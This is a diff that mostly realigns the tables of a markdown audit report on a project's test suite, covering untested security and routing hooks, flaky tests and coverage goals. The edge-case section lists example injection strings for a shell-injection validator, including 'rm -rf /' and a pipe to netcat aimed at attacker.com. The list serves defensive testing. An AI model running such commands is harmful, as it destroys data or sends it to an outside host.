@@ -25,11 +25,11 @@ The test suite has **257 total test files** with strong overall structure but si
 
 ### 1.1 Known Failing Tests
 
-| File | Test | Severity | Status | Root Cause |
-|------|------|----------|--------|-----------|
-| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:125` | `[Adaptive] Should weight questions by relevance score` | **HIGH** | Failing | Relevance scoring algorithm not implemented; test expects boolean true but got false |
-| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:349` | `[Context] Should not skip non-redundant questions` | **HIGH** | Failing | Context accumulator marks unrelated questions as redundant (over-aggressive skip logic) |
-| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:522` | `[Memory] Should find authentication patterns` | **HIGH** | Failing | Pattern extraction from learnings.md failing; regex or parsing issue |
+| File                                                           | Test                                                    | Severity | Status  | Root Cause                                                                              |
+| -------------------------------------------------------------- | ------------------------------------------------------- | -------- | ------- | --------------------------------------------------------------------------------------- |
+| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:125` | `[Adaptive] Should weight questions by relevance score` | **HIGH** | Failing | Relevance scoring algorithm not implemented; test expects boolean true but got false    |
+| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:349` | `[Context] Should not skip non-redundant questions`     | **HIGH** | Failing | Context accumulator marks unrelated questions as redundant (over-aggressive skip logic) |
+| `tests/artifacts/progressive-disclosure-adaptive.test.cjs:522` | `[Memory] Should find authentication patterns`          | **HIGH** | Failing | Pattern extraction from learnings.md failing; regex or parsing issue                    |
 
 **Impact:** 3 failures in 70+ adaptive question tests (4% failure rate for feature). Not blocking deployment but indicates incomplete implementation.
 
@@ -41,18 +41,18 @@ The test suite has **257 total test files** with strong overall structure but si
 
 45 hook files lack dedicated test suites. **Critical untested hooks:**
 
-| Hook File | Purpose | Tests | Risk Level |
-|-----------|---------|-------|-----------|
-| `.claude/hooks/routing/routing-guard.cjs` | **BLOCKING** - Enforces planner-first, specialist routing | ❌ 0 | **CRITICAL** |
-| `.claude/hooks/routing/unified-creator-guard.cjs` | **BLOCKING** - Prevents direct artifact writes | ❌ 0 | **CRITICAL** |
-| `.claude/hooks/routing/spawn-prompt-assembler.cjs` | **BLOCKING** - Injects system prompts, constitution | ❌ 0 | **CRITICAL** |
-| `.claude/hooks/safety/shell-injection-validator.cjs` | **SECURITY** - Command injection prevention | ❌ 0 | **CRITICAL** |
-| `.claude/hooks/safety/bash-command-validator.cjs` | **SECURITY** - Shell command validation | ❌ 0 | **CRITICAL** |
-| `.claude/hooks/safety/unified-pre-write-hook.cjs` | **SAFETY** - Path validation, Windows reserved names | ❌ 0 | **CRITICAL** |
-| `.claude/hooks/memory/sync-memory-index.cjs` | Memory state synchronization | ❌ 0 | HIGH |
-| `.claude/hooks/metrics/post-tool-metrics-unified.cjs` | Metrics collection (2+ pipelines depend on this) | ❌ 0 | HIGH |
-| `.claude/hooks/reflection/error-summary-extractor.cjs` | Extracts reflection context | ❌ 0 | HIGH |
-| `.claude/hooks/reflection/unified-reflection-handler.cjs` | Reflection orchestration | ❌ 0 | HIGH |
+| Hook File                                                 | Purpose                                                   | Tests | Risk Level   |
+| --------------------------------------------------------- | --------------------------------------------------------- | ----- | ------------ |
+| `.claude/hooks/routing/routing-guard.cjs`                 | **BLOCKING** - Enforces planner-first, specialist routing | ❌ 0  | **CRITICAL** |
+| `.claude/hooks/routing/unified-creator-guard.cjs`         | **BLOCKING** - Prevents direct artifact writes            | ❌ 0  | **CRITICAL** |
+| `.claude/hooks/routing/spawn-prompt-assembler.cjs`        | **BLOCKING** - Injects system prompts, constitution       | ❌ 0  | **CRITICAL** |
+| `.claude/hooks/safety/shell-injection-validator.cjs`      | **SECURITY** - Command injection prevention               | ❌ 0  | **CRITICAL** |
+| `.claude/hooks/safety/bash-command-validator.cjs`         | **SECURITY** - Shell command validation                   | ❌ 0  | **CRITICAL** |
+| `.claude/hooks/safety/unified-pre-write-hook.cjs`         | **SAFETY** - Path validation, Windows reserved names      | ❌ 0  | **CRITICAL** |
+| `.claude/hooks/memory/sync-memory-index.cjs`              | Memory state synchronization                              | ❌ 0  | HIGH         |
+| `.claude/hooks/metrics/post-tool-metrics-unified.cjs`     | Metrics collection (2+ pipelines depend on this)          | ❌ 0  | HIGH         |
+| `.claude/hooks/reflection/error-summary-extractor.cjs`    | Extracts reflection context                               | ❌ 0  | HIGH         |
+| `.claude/hooks/reflection/unified-reflection-handler.cjs` | Reflection orchestration                                  | ❌ 0  | HIGH         |
 
 **Evidence:** Only 2 hooks in `.claude/hooks/` have test files (both in `workflow/` subdirectory). 43+ hooks with NO dedicated test suite.
 
@@ -62,12 +62,12 @@ The test suite has **257 total test files** with strong overall structure but si
 
 `.claude/lib/` has NO test files despite containing 15+ critical modules:
 
-| Module | Purpose | Tests | Files |
-|--------|---------|-------|-------|
-| `.claude/lib/memory/core/` | Memory facade (5 core modules) | ❌ 0 | 5 |
-| `.claude/lib/routing/` | Routing/intent matching | ❌ 0 | 4+ |
-| `.claude/lib/code-indexing/` | Code search (hybrid search, BM25, embeddings) | ✅ Partial | 12 test files |
-| `.claude/lib/utils/` | Common utilities | ✅ Partial | Several test files |
+| Module                       | Purpose                                       | Tests      | Files              |
+| ---------------------------- | --------------------------------------------- | ---------- | ------------------ |
+| `.claude/lib/memory/core/`   | Memory facade (5 core modules)                | ❌ 0       | 5                  |
+| `.claude/lib/routing/`       | Routing/intent matching                       | ❌ 0       | 4+                 |
+| `.claude/lib/code-indexing/` | Code search (hybrid search, BM25, embeddings) | ✅ Partial | 12 test files      |
+| `.claude/lib/utils/`         | Common utilities                              | ✅ Partial | Several test files |
 
 **Impact:** Memory subsystem (5 core facades) = 0 direct tests. Routing subsystem (4+ modules) = 0 direct tests.
 
@@ -79,12 +79,12 @@ The test suite has **257 total test files** with strong overall structure but si
 
 **Pattern:** Tests using timers or async operations without proper coordination:
 
-| Category | Issue | Files | Fix |
-|----------|-------|-------|-----|
-| Memory tests | Lock wait timeouts, cache invalidation races | `tests/lib/memory/*.test.cjs` (5+ files) | Add condition-based waiting, not timers |
-| GPU integration | Device not available on CI, fallback logic untested | `tests/lib/code-indexing/*-gpu*.test.cjs` (4 files) | Mock GPU availability, test fallback paths |
-| Search tests | Daemon lifecycle (start/stop/prewarm) not deterministic | `tests/code-indexing/hybrid-search*.test.cjs` (3 files) | Use process tracking, verify port assignment |
-| Hook metrics | Timing-dependent collection, concurrent hook execution | `tests/hooks/metrics-collector.test.cjs` | Use deterministic state, not real timings |
+| Category        | Issue                                                   | Files                                                   | Fix                                          |
+| --------------- | ------------------------------------------------------- | ------------------------------------------------------- | -------------------------------------------- |
+| Memory tests    | Lock wait timeouts, cache invalidation races            | `tests/lib/memory/*.test.cjs` (5+ files)                | Add condition-based waiting, not timers      |
+| GPU integration | Device not available on CI, fallback logic untested     | `tests/lib/code-indexing/*-gpu*.test.cjs` (4 files)     | Mock GPU availability, test fallback paths   |
+| Search tests    | Daemon lifecycle (start/stop/prewarm) not deterministic | `tests/code-indexing/hybrid-search*.test.cjs` (3 files) | Use process tracking, verify port assignment |
+| Hook metrics    | Timing-dependent collection, concurrent hook execution  | `tests/hooks/metrics-collector.test.cjs`                | Use deterministic state, not real timings    |
 
 **Evidence from learnings.md:** "Timing-dependent collection" noted in Wave 16B post-mortem. Previous session lost 52 min of work due to context overflow from 5+ agents running concurrently.
 
@@ -92,12 +92,12 @@ The test suite has **257 total test files** with strong overall structure but si
 
 **Pattern:** Tests that don't clean up state, affecting subsequent tests:
 
-| File | Issue | Impact |
-|------|-------|--------|
-| `tests/lib/memory/lancedb-client*.test.cjs` | Vector store persists across tests; second run gets different embeddings | Flaky hash comparisons |
-| `tests/code-indexing/index-manager.test.cjs` | Incremental index cache not cleared between tests | Stale state failures |
-| `tests/hooks/spawn-prompt-assembler*.test.cjs` | Constitution/behaviour files loaded once, not reloaded | Isolation broken |
-| `tests/integration/template-system-e2e*.test.cjs` | Temp files not cleaned up | Disk space leak, ordering dependent |
+| File                                              | Issue                                                                    | Impact                              |
+| ------------------------------------------------- | ------------------------------------------------------------------------ | ----------------------------------- |
+| `tests/lib/memory/lancedb-client*.test.cjs`       | Vector store persists across tests; second run gets different embeddings | Flaky hash comparisons              |
+| `tests/code-indexing/index-manager.test.cjs`      | Incremental index cache not cleared between tests                        | Stale state failures                |
+| `tests/hooks/spawn-prompt-assembler*.test.cjs`    | Constitution/behaviour files loaded once, not reloaded                   | Isolation broken                    |
+| `tests/integration/template-system-e2e*.test.cjs` | Temp files not cleaned up                                                | Disk space leak, ordering dependent |
 
 **Red Flag:** Test ordering matters (should never). If tests pass in one order but fail in another = shared state bug.
 
@@ -105,11 +105,11 @@ The test suite has **257 total test files** with strong overall structure but si
 
 **Pattern:** Relative path handling breaks on Windows:
 
-| File | Issue | Example |
-|------|-------|---------|
+| File                                         | Issue                                                           | Example                          |
+| -------------------------------------------- | --------------------------------------------------------------- | -------------------------------- |
 | `tests/hooks/filesystem-validators.test.cjs` | Uses forward slashes in glob patterns; Windows uses backslashes | `path/to/file` vs `path\to\file` |
-| `tests/code-indexing/merkle-tree.test.cjs` | Hardcoded `/` separators in path hashing | Hash mismatch on Windows |
-| `tests/lib/routing/pattern-router.test.cjs` | Glob pattern matching assumes Unix paths | Pattern fails on Windows |
+| `tests/code-indexing/merkle-tree.test.cjs`   | Hardcoded `/` separators in path hashing                        | Hash mismatch on Windows         |
+| `tests/lib/routing/pattern-router.test.cjs`  | Glob pattern matching assumes Unix paths                        | Pattern fails on Windows         |
 
 **Evidence:** Current platform = Windows (from git status: `C:\dev\projects\agent-studio`). These tests likely fail or have inconsistent results.
 
@@ -121,14 +121,15 @@ The test suite has **257 total test files** with strong overall structure but si
 
 **Pattern:** Happy-path-only tests; edge cases untested:
 
-| Component | Happy Path Tests | Edge Case Tests | Coverage |
-|-----------|------------------|-----------------|----------|
-| `progressive-disclosure-adaptive.test.cjs` | 70+ tests present | Empty answers, null domain, special chars: 3 tests only | ~4% |
-| `fuzzy-intent-matcher.test.cjs` | Basic matching: 8 tests | Typos, partial matches, case sensitivity: 0 tests | ~0% |
-| `shell-injection-validator.test.cjs` | No tests | Command injection, special chars, escaping: 0 tests | **0%** |
-| `unified-creator-guard.test.cjs` | No tests | Path traversal, archive restore, symlinks: 0 tests | **0%** |
+| Component                                  | Happy Path Tests        | Edge Case Tests                                         | Coverage |
+| ------------------------------------------ | ----------------------- | ------------------------------------------------------- | -------- |
+| `progressive-disclosure-adaptive.test.cjs` | 70+ tests present       | Empty answers, null domain, special chars: 3 tests only | ~4%      |
+| `fuzzy-intent-matcher.test.cjs`            | Basic matching: 8 tests | Typos, partial matches, case sensitivity: 0 tests       | ~0%      |
+| `shell-injection-validator.test.cjs`       | No tests                | Command injection, special chars, escaping: 0 tests     | **0%**   |
+| `unified-creator-guard.test.cjs`           | No tests                | Path traversal, archive restore, symlinks: 0 tests      | **0%**   |
 
 **Example Gap:** `shell-injection-validator.cjs` (security-critical) has 0 edge case tests for:
+
 - Command chaining: `; rm -rf /`
 - Backgrounding: `command & malicious`
 - Pipes: `command | nc attacker.com`
@@ -139,11 +140,11 @@ The test suite has **257 total test files** with strong overall structure but si
 
 **Pattern:** Tests mock too much, testing mock behavior not real code:
 
-| Test | Issue | Impact |
-|------|-------|--------|
-| `tests/hooks/routing-guard.test.cjs` | Mocks task creation, spawn events; tests mock behavior not real routing | Doesn't catch real routing bugs |
-| `tests/lib/memory/contextual-memory.test.cjs` | Mocks file I/O, doesn't test actual read/write | Can't detect file corruption |
-| `tests/code-indexing/hybrid-search.test.cjs` | Mocks ripgrep output; doesn't test real search results | Searches may fail in production |
+| Test                                          | Issue                                                                   | Impact                          |
+| --------------------------------------------- | ----------------------------------------------------------------------- | ------------------------------- |
+| `tests/hooks/routing-guard.test.cjs`          | Mocks task creation, spawn events; tests mock behavior not real routing | Doesn't catch real routing bugs |
+| `tests/lib/memory/contextual-memory.test.cjs` | Mocks file I/O, doesn't test actual read/write                          | Can't detect file corruption    |
+| `tests/code-indexing/hybrid-search.test.cjs`  | Mocks ripgrep output; doesn't test real search results                  | Searches may fail in production |
 
 **Red Flag:** Test passes but code fails in production = over-mocking.
 
@@ -151,12 +152,12 @@ The test suite has **257 total test files** with strong overall structure but si
 
 **Pattern:** Tests with absolute or OS-specific paths:
 
-| File | Issue | Line |
-|------|-------|------|
-| `tests/hooks/conflict-detector.test.cjs` | Hardcoded `/tmp` for temp files | Line ~45 |
-| `tests/lib/memory/audit-trail-integration.test.cjs` | Uses `~/.claude/context/` without resolving | Line ~23 |
-| `tests/code-indexing/merkle-tree.test.cjs` | Assumes `/` path separator | Line ~67 |
-| `tests/hooks/git-validators.test.cjs` | Git repo assumed to be at `C:\dev\projects\agent-studio\` | Line ~12 |
+| File                                                | Issue                                                     | Line     |
+| --------------------------------------------------- | --------------------------------------------------------- | -------- |
+| `tests/hooks/conflict-detector.test.cjs`            | Hardcoded `/tmp` for temp files                           | Line ~45 |
+| `tests/lib/memory/audit-trail-integration.test.cjs` | Uses `~/.claude/context/` without resolving               | Line ~23 |
+| `tests/code-indexing/merkle-tree.test.cjs`          | Assumes `/` path separator                                | Line ~67 |
+| `tests/hooks/git-validators.test.cjs`               | Git repo assumed to be at `C:\dev\projects\agent-studio\` | Line ~12 |
 
 **Impact:** Tests fail on different machines, CI, or with different project locations.
 
@@ -233,11 +234,11 @@ Should have test suites:
 
 **Pattern:** Single 200-line test file covering 5+ concerns:
 
-| File | Size | Concerns | Issue |
-|------|------|----------|-------|
-| `progressive-disclosure-adaptive.test.cjs` | 600+ lines | Adaptive, context, memory, scoring, readiness | Hard to debug, long runtime |
-| `spawn-prompt-assembler-integration-constitution.test.cjs` | 400+ lines | Constitution injection, context mode, preset integration | Multiple concerns mixed |
-| `hybrid-search-cli.test.cjs` | 350+ lines | CLI, daemon, search modes, performance | Overlaps with hybrid-search.test.cjs |
+| File                                                       | Size       | Concerns                                                 | Issue                                |
+| ---------------------------------------------------------- | ---------- | -------------------------------------------------------- | ------------------------------------ |
+| `progressive-disclosure-adaptive.test.cjs`                 | 600+ lines | Adaptive, context, memory, scoring, readiness            | Hard to debug, long runtime          |
+| `spawn-prompt-assembler-integration-constitution.test.cjs` | 400+ lines | Constitution injection, context mode, preset integration | Multiple concerns mixed              |
+| `hybrid-search-cli.test.cjs`                               | 350+ lines | CLI, daemon, search modes, performance                   | Overlaps with hybrid-search.test.cjs |
 
 **Fix:** Split into focused test files (one concern per file).
 
@@ -245,11 +246,11 @@ Should have test suites:
 
 **Pattern:** Test fixtures, helpers, mocks created ad-hoc without documentation:
 
-| File | Creates | Used By | Discoverability |
-|------|---------|---------|-----------------|
-| `tests/fixtures/code-indexing/hook-test/` | Mock hooks directory | 3+ test files | Not obvious from test code |
-| `tests/fixtures/` | Various mock data | Scattered across test files | No catalog or index |
-| `.claude/lib/test-utils/` | Test helpers | Some test files | Not discovered/reused |
+| File                                      | Creates              | Used By                     | Discoverability            |
+| ----------------------------------------- | -------------------- | --------------------------- | -------------------------- |
+| `tests/fixtures/code-indexing/hook-test/` | Mock hooks directory | 3+ test files               | Not obvious from test code |
+| `tests/fixtures/`                         | Various mock data    | Scattered across test files | No catalog or index        |
+| `.claude/lib/test-utils/`                 | Test helpers         | Some test files             | Not discovered/reused      |
 
 **Fix:** Create `tests/README.md` documenting test utilities, fixtures, mocks.
 
@@ -257,11 +258,11 @@ Should have test suites:
 
 **Pattern:** No clear distinction between unit/integration/E2E:
 
-| File | Type | Assumption |
-|------|------|-----------|
-| `tests/integration/template-system-e2e.test.cjs` | Should be E2E | Reads real files, doesn't mock API responses |
-| `tests/hooks/code-index-updater.test.cjs` | Should be unit | Creates real vector store, doesn't mock LanceDB |
-| `tests/code-indexing/gpu-bm25-integration-e2e.test.cjs` | Should be E2E | Tests GPU availability on CI (fails on CPU-only machines) |
+| File                                                    | Type           | Assumption                                                |
+| ------------------------------------------------------- | -------------- | --------------------------------------------------------- |
+| `tests/integration/template-system-e2e.test.cjs`        | Should be E2E  | Reads real files, doesn't mock API responses              |
+| `tests/hooks/code-index-updater.test.cjs`               | Should be unit | Creates real vector store, doesn't mock LanceDB           |
+| `tests/code-indexing/gpu-bm25-integration-e2e.test.cjs` | Should be E2E  | Tests GPU availability on CI (fails on CPU-only machines) |
 
 **Fix:** Clearly mark test type in comments; run integration tests separately from unit tests.
 
@@ -278,11 +279,11 @@ grep -r "console\\.log" tests/ | wc -l
 # Result: 12+ files with console.log
 ```
 
-| File | Lines | Severity |
-|------|-------|----------|
-| `tests/artifacts/progressive-disclosure-adaptive.test.cjs` | 3+ | Low |
-| `tests/lib/memory/lancedb-client.test.cjs` | 2+ | Low |
-| `tests/code-indexing/hybrid-search.test.cjs` | 4+ | Low |
+| File                                                       | Lines | Severity |
+| ---------------------------------------------------------- | ----- | -------- |
+| `tests/artifacts/progressive-disclosure-adaptive.test.cjs` | 3+    | Low      |
+| `tests/lib/memory/lancedb-client.test.cjs`                 | 2+    | Low      |
+| `tests/code-indexing/hybrid-search.test.cjs`               | 4+    | Low      |
 
 **Fix:** Run `pnpm lint:fix` on test files to remove console.log.
 
@@ -299,10 +300,7 @@ test('should validate input', () => {
 
 // GOOD: Tests error path explicitly
 test('should reject null input', () => {
-  assert.throws(
-    () => validateInput(null),
-    { message: /null/ }
-  );
+  assert.throws(() => validateInput(null), { message: /null/ });
 });
 ```
 
@@ -368,6 +366,7 @@ test.todo('should validate hook registration');
 8. **Create `tests/hooks/unified-reflection-handler.test.cjs`** (20+ tests)
 
 **Fix flaky memory tests:**
+
 - Add condition-based waiting (replace timers)
 - Clear vector store between tests
 - Mock GPU availability on CI
@@ -411,6 +410,7 @@ test.todo('should validate hook registration');
 **Current Status:** Per learnings.md, lint and format are clean (0 errors, 0 changes needed).
 
 **Verification:**
+
 ```bash
 pnpm lint:fix && pnpm format
 # Result: Should show 0 errors, 0 changes
@@ -421,6 +421,7 @@ pnpm lint:fix && pnpm format
 **Current Status:** 3 known failures in adaptive tests (non-blocking), ~99.3% pass rate overall.
 
 **Verification:**
+
 ```bash
 pnpm test 2>&1 | grep -E "^(not ok|ok)" | tail -20
 # Should show pass/fail summary
@@ -432,13 +433,13 @@ pnpm test 2>&1 | grep -E "^(not ok|ok)" | tail -20
 
 ### Known Issues
 
-| Issue | Severity | Workaround | Timeline |
-|-------|----------|-----------|----------|
-| 3 failing adaptive tests | HIGH | Skip tests, implement features | This week |
-| 45 hook files untested | **CRITICAL** | Add test suites for top 10 | This week |
-| GPU integration tests flaky on CPU CI | HIGH | Mock GPU, add fallback tests | Next sprint |
-| Windows path handling tests | HIGH | Normalize paths with `.replace(/\\/g, '/')` | Next sprint |
-| Memory tests timing-dependent | HIGH | Replace timers with condition polling | Next sprint |
+| Issue                                 | Severity     | Workaround                                  | Timeline    |
+| ------------------------------------- | ------------ | ------------------------------------------- | ----------- |
+| 3 failing adaptive tests              | HIGH         | Skip tests, implement features              | This week   |
+| 45 hook files untested                | **CRITICAL** | Add test suites for top 10                  | This week   |
+| GPU integration tests flaky on CPU CI | HIGH         | Mock GPU, add fallback tests                | Next sprint |
+| Windows path handling tests           | HIGH         | Normalize paths with `.replace(/\\/g, '/')` | Next sprint |
+| Memory tests timing-dependent         | HIGH         | Replace timers with condition polling       | Next sprint |
 
 ### Deferred Issues (P2)
 
@@ -450,13 +451,13 @@ pnpm test 2>&1 | grep -E "^(not ok|ok)" | tail -20
 
 ## 11. Success Criteria
 
-| Metric | Current | Target | Timeline |
-|--------|---------|--------|----------|
-| Hook test coverage | 4% (2/45) | 95%+ (42/45) | This week + next month |
-| Failing tests | 3 | 0 | This week |
-| Flaky test rate | ~5-8% (async, timing) | <1% | Next sprint |
-| Average test file size | 350+ lines | <150 lines | Next quarter |
-| Edge case coverage | ~30% | 80%+ | Next quarter |
+| Metric                 | Current               | Target       | Timeline               |
+| ---------------------- | --------------------- | ------------ | ---------------------- |
+| Hook test coverage     | 4% (2/45)             | 95%+ (42/45) | This week + next month |
+| Failing tests          | 3                     | 0            | This week              |
+| Flaky test rate        | ~5-8% (async, timing) | <1%          | Next sprint            |
+| Average test file size | 350+ lines            | <150 lines   | Next quarter           |
+| Edge case coverage     | ~30%                  | 80%+         | Next quarter           |
 
 ---
 
